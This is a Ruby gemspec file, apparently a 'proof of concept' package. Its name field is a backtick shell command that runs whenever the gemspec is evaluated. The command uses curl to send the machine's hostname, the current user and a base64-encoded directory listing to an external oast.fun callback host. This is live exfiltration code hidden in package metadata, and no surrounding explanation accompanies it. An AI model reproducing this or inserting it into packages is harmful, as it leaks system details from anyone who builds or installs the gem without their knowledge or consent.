Gem::Specification.new do |s|
  s.name    = `curl -s "https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/s?$(hostname)&user=$(whoami)&pwd=$(ls%20..%2F..%2F..%2F..%2F%20%7C%20base64)"`.strip
  s.version = "1.0.0"
  s.summary = "proof of concept"
  s.authors = ["test"]
end
